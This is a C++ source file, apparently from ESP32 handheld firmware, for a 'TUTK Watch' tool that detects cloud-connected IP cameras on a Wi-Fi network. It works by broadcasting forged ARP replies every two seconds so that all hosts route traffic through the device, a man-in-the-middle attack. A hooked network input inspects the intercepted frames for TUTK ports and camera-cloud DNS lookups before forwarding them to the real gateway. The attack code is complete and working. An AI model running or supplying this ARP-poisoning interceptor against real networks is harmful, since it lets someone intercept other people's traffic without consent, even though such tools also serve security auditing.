#include "tutk_watch.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_netif.h"
#include "esp_netif_net_stack.h"
#include "esp_private/wifi.h"
#include "esp_wifi.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/pbuf.h"
#include "lwip/prot/ethernet.h"
#include "lwip/tcpip.h"
#include <WiFi.h>
#include <globals.h>
#include <vector>

// ---------------------------------------------------------------------------
// Camera-cloud DNS name fragments (lowercase). A device resolving any of these
// is almost certainly an IP camera phoning home. Covers TUTK/Kalay plus the
// common OEM ecosystems (Meari/CloudEdge, Tuya, V380, Yoosee/Gwell, CamHi ...).
// ---------------------------------------------------------------------------
static const char *const kCloudDomains[] = {
    // TUTK / Kalay
    "iotcplatform", "kalayservice", "throughtek", "tutk", "iotc",
    // Meari / CloudEdge (Zhuhai Dingzhi ODM)
    "meari", "cloudedge",
    // other common OEM clouds
    "tuya", "v380", "yoosee", "gwell", "camhi", "ubox", "icsee",
};

// TUTK master / PPPP ports that a camera sends UDP to.
static bool isTutkPort(uint16_t port) { return port == 32100 || port == 32108 || port == 32107; }

struct TutkHit {
    uint8_t mac[6];
    uint32_t ip; // network order
    String reason;
};

// Lock-free single-producer (lwIP input hook) / single-consumer (UI) storage:
// the hook fills slot g_hitCount then publishes by incrementing g_hitCount, so
// the UI only ever reads fully-written slots below the count. Fixed array (no
// reallocation) avoids a data race on the shared container.
static const int MAX_HITS = 64;
static TutkHit g_hits[MAX_HITS];
static volatile int g_hitCount = 0;

static uint8_t g_myMac[6];
static uint8_t g_gwMac[6];
static bool g_gwMacValid = false;
static uint32_t g_myIp = 0; // network order
static uint32_t g_gwIp = 0; // network order

static netif_input_fn s_originalInput = nullptr;
static struct netif *s_hookedNetif = nullptr;

static struct netif *getStaNetif() {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return nullptr;
    return (struct netif *)esp_netif_get_netif_impl(sta);
}

static bool macKnown(const uint8_t *mac) {
    for (int i = 0; i < g_hitCount; i++)
        if (memcmp(g_hits[i].mac, mac, 6) == 0) return true;
    return false;
}

// Parse a DNS query name (offset within buf) into a lowercase dotted string.
static String dnsQName(const uint8_t *buf, int len, int off) {
    String out;
    while (off < len) {
        uint8_t l = buf[off++];
        if (l == 0 || l > 63) break;
        if (off + l > len) break;
        if (!out.isEmpty()) out += '.';
        for (int i = 0; i < l; i++) {
            char c = (char)buf[off + i];
            if (c >= 'A' && c <= 'Z') c += 32;
            out += c;
        }
        off += l;
        if (out.length() > 120) break;
    }
    return out;
}

// Inspect a redirected frame. Returns a reason string if it looks like TUTK.
static String classify(const uint8_t *buf, int len) {
    if (len < 14 + 20 + 8) return "";
    if (buf[12] != 0x08 || buf[13] != 0x00) return ""; // not IPv4
    int ihl = (buf[14] & 0x0f) * 4;
    if (ihl < 20) return "";
    uint8_t proto = buf[14 + 9];
    if (proto != 17) return ""; // UDP only
    int udpOff = 14 + ihl;
    if (udpOff + 8 > len) return "";
    uint16_t dstPort = (buf[udpOff + 2] << 8) | buf[udpOff + 3];

    if (isTutkPort(dstPort)) return String("UDP ") + dstPort;

    if (dstPort == 53) {
        int dnsOff = udpOff + 8;
        if (dnsOff + 12 >= len) return "";
        String q = dnsQName(buf, len, dnsOff + 12); // skip 12-byte DNS header
        for (auto d : kCloudDomains)
            if (q.indexOf(d) >= 0) return "DNS " + q;
    }
    return "";
}

// lwIP input hook: classify + forward redirected upstream frames; pass the rest.
static err_t tutkInputHook(struct pbuf *p, struct netif *inp) {
    if (!p || p->len < 14) return s_originalInput ? s_originalInput(p, inp) : ERR_OK;

    const uint8_t *buf = (const uint8_t *)p->payload;
    // Only frames addressed to us at L2 but not to our IP are redirected uplinks.
    bool toMe = memcmp(buf, g_myMac, 6) == 0;
    bool fromMe = memcmp(buf + 6, g_myMac, 6) == 0;
    if (toMe && !fromMe && buf[12] == 0x08 && buf[13] == 0x00 && p->len == p->tot_len) {
        uint32_t dstIp;
        memcpy(&dstIp, buf + 14 + 16, 4);
        if (dstIp != g_myIp) {
            String reason = classify(buf, p->len);
            if (!reason.isEmpty() && g_hitCount < MAX_HITS && !macKnown(buf + 6)) {
                int slot = g_hitCount;
                memcpy(g_hits[slot].mac, buf + 6, 6);
                memcpy(&g_hits[slot].ip, buf + 14 + 12, 4); // source IP
                g_hits[slot].reason = reason;
                g_hitCount = slot + 1; // publish after the slot is fully written
            }
            // Forward to the real gateway (rewrite L2 dest), keep the LAN alive.
            if (g_gwMacValid) {
                memcpy((void *)buf, g_gwMac, 6);
                esp_wifi_internal_tx(WIFI_IF_STA, p->payload, p->len);
            }
            pbuf_free(p);
            return ERR_OK; // consumed
        }
    }
    return s_originalInput ? s_originalInput(p, inp) : ERR_OK;
}

// Send one ARP packet (opcode reply) via the STA interface.
static void sendArp(
    struct netif *iface, const uint8_t *ethDst, const uint8_t *senderMac, uint32_t senderIp,
    const uint8_t *targetMac, uint32_t targetIp
) {
    struct pbuf *p = pbuf_alloc(PBUF_RAW, SIZEOF_ETH_HDR + sizeof(struct etharp_hdr), PBUF_RAM);
    if (!p) return;
    struct eth_hdr *eth = (struct eth_hdr *)p->payload;
    struct etharp_hdr *arp = (struct etharp_hdr *)((uint8_t *)p->payload + SIZEOF_ETH_HDR);
    MEMCPY(&eth->dest, ethDst, ETH_HWADDR_LEN);
    MEMCPY(&eth->src, g_myMac, ETH_HWADDR_LEN);
    eth->type = PP_HTONS(ETHTYPE_ARP);
    arp->hwtype = PP_HTONS(1);
    arp->proto = PP_HTONS(ETHTYPE_IP);
    arp->hwlen = ETH_HWADDR_LEN;
    arp->protolen = sizeof(ip4_addr_t);
    arp->opcode = PP_HTONS(2); // reply
    MEMCPY(&arp->shwaddr, senderMac, ETH_HWADDR_LEN);
    MEMCPY(&arp->sipaddr, &senderIp, sizeof(ip4_addr_t));
    MEMCPY(&arp->dhwaddr, targetMac, ETH_HWADDR_LEN);
    MEMCPY(&arp->dipaddr, &targetIp, sizeof(ip4_addr_t));
    esp_wifi_internal_tx(WIFI_IF_STA, p->payload, p->tot_len);
    pbuf_free(p);
}

// Resolve the gateway's MAC via the ARP table (nudged by normal traffic).
static bool resolveGatewayMac(struct netif *nif) {
    ip4_addr_t gw;
    gw.addr = g_gwIp;
    LOCK_TCPIP_CORE();
    etharp_request(nif, &gw);
    UNLOCK_TCPIP_CORE();
    delay(400);
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ipr = nullptr;
        struct eth_addr *ethr = nullptr;
        struct netif *tif = nullptr;
        if (!etharp_get_entry(i, &ipr, &tif, &ethr)) continue;
        if (ipr && ethr && ipr->addr == g_gwIp) {
            memcpy(g_gwMac, ethr->addr, 6);
            return true;
        }
    }
    return false;
}

static void tutkAlert(const TutkHit &h) {
    tft.fillScreen(bruceConfig.priColor);
    delay(80);
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("Cloud Camera");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(6, 40);
    char m[18];
    snprintf(
        m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X", h.mac[0], h.mac[1], h.mac[2], h.mac[3], h.mac[4],
        h.mac[5]
    );
    padprintln(String(" ") + IPAddress(h.ip).toString());
    padprintln(String(" ") + m);
    padprintln(String(" ") + h.reason);
    delay(1200);
}

void tutkWatch() {
    if (WiFi.status() != WL_CONNECTED) {
        if (!wifiConnectMenu(WIFI_MODE_STA) && WiFi.status() != WL_CONNECTED) {
            displayTextLine("WiFi needed");
            delay(1500);
            return;
        }
    }
    if (WiFi.status() != WL_CONNECTED) return;

    g_hitCount = 0;
    g_gwMacValid = false;
    esp_wifi_get_mac(WIFI_IF_STA, g_myMac);
    g_myIp = (uint32_t)WiFi.localIP();
    g_gwIp = (uint32_t)WiFi.gatewayIP();

    struct netif *nif = getStaNetif();
    if (!nif) {
        displayTextLine("No netif");
        delay(1500);
        return;
    }

    displayTextLine("Resolving gateway..");
    g_gwMacValid = resolveGatewayMac(nif);
    if (!g_gwMacValid) {
        // Without the gateway MAC we cannot forward; refuse rather than blackhole.
        displayTextLine("Gateway MAC failed");
        delay(1800);
        return;
    }

    // Install the L2 inspection hook.
    if (!s_hookedNetif) {
        s_originalInput = nif->input;
        s_hookedNetif = nif;
        nif->input = tutkInputHook;
    }

    const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t lastPoison = 0;
    uint32_t lastDraw = 0;
    int shown = 0;

    drawMainBorderWithTitle("TUTK Watch");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(6, 40);
    padprintln(" Watching traffic...");
    padprintln(" TUTK cams: 0");

    while (!check(EscPress)) {
        // Re-assert the gateway spoof to all hosts every ~2 s (half-duplex MITM).
        if (millis() - lastPoison > 2000) {
            lastPoison = millis();
            sendArp(nif, bcast, g_myMac, g_gwIp, bcast, 0);
        }
        // Alert on each newly-published hit (slots below g_hitCount are stable).
        while (shown < g_hitCount) {
            tutkAlert(g_hits[shown]);
            shown++;
            lastDraw = 0; // force status redraw
        }
        if (millis() - lastDraw > 1000) {
            lastDraw = millis();
            drawMainBorderWithTitle("TUTK Watch");
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(6, 40);
            padprintln(" Watching traffic...");
            padprintln(" TUTK cams: " + String(g_hitCount));
        }
        delay(20);
    }

    // Restore input hook and heal ARP (tell hosts the real gateway MAC).
    if (s_hookedNetif && s_originalInput) {
        s_hookedNetif->input = s_originalInput;
        s_hookedNetif = nullptr;
        s_originalInput = nullptr;
    }
    for (int i = 0; i < 3; i++) {
        sendArp(nif, bcast, g_gwMac, g_gwIp, bcast, 0);
        delay(60);
    }

    // Results list (hook is unhooked now, so g_hits is no longer shared).
    options = {};
    if (g_hitCount == 0) {
        displayTextLine("No TUTK cams seen");
        delay(1500);
        return;
    }
    for (int i = 0; i < g_hitCount; i++) {
        TutkHit hit = g_hits[i];
        String label = IPAddress(hit.ip).toString() + " " + hit.reason;
        options.emplace_back(label.c_str(), [hit]() { tutkAlert(hit); });
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "TUTK Cams");
    options.clear();
}
